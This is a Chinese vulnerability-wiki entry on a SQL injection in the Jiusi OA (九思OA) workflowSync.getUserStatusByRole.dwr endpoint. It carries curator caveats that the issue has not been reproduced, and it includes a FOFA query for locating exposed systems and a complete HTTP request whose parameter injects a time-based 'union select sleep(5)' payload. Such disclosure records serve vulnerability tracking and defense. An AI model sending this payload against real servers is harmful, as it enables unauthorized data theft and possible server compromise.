---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "九思OA workflowSync.getUserStatusByRole.dwr SQL注入"
product: "九思OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本；MySQL sleep及DWR参数格式"
prerequisites: "未说明；无凭证请求"
side_effects: "命令/代码执行示例可能改变主机状态；延迟探测可能占用数据库连接或影响服务"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E4%B9%9D%E6%80%9DOA/%E4%B9%9D%E6%80%9DOA%20workflowSync.getUserStatusByRole.dwr%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"九思软件-OA\""
id: "vw-e43b1c3de5845e164a32f72e"
entity_id: "ve-e43b1c3de5845e164a32f72e"
schema_version: "1"
---

# 九思OA workflowSync.getUserStatusByRole.dwr SQL注入

## 条目说明

- 对象与具体问题：九思OA；workflowSync.getUserStatusByRole.dwr SQL注入
- 版本、配置及部署条件：无版本；MySQL sleep及DWR参数格式
- 认证与权限前提：未说明；无凭证请求
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 接口和c0-param1可定位；只给延迟样本，无基准差分或查询根因
- HTTP缺围栏，在野利用/RCE结论均无直接支持

## 操作风险

命令/代码执行示例可能改变主机状态；延迟探测可能占用数据库连接或影响服务。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 漏洞描述

北京九思协同办公软件 /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr接口处存在SQL注入漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

## 影响版本

北京九思协同办公软件

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：app="九思软件-OA"

POC/EXP：

```http
POST /jsoa/workflow/dwr/exec/workflowSync.getUserStatusByRole.dwr HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Connection: close

callCount=1
c0-scriptName=workflowSync
c0-methodName=getUserStatusByRole
c0-id=1
c0-param0=string:1
c0-param1=string:1 union select 0,sleep(5)#
xml=true
```


![image-20241127223724589](./.resource/九思OAworkflowSync.getUserStatusByRole.dwrSQL注入漏洞/media/image-20241127223724589.png)


## 漏洞修复

关闭互联网暴露面或接口设置访问权限

升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
